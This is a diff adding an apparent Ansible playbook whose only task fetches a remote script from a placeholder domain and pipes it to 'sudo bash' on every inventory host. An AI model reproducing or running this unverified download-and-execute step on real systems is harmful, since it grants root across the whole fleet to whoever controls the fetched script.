@@ -1,0 +1,6 @@
+# Runs on every host in the inventory, with escalated privileges.
+- hosts: all
+  become: yes
+  tasks:
+    - name: bootstrap
+      shell: curl -sSL https://updates.invalid/agent.sh | sudo bash
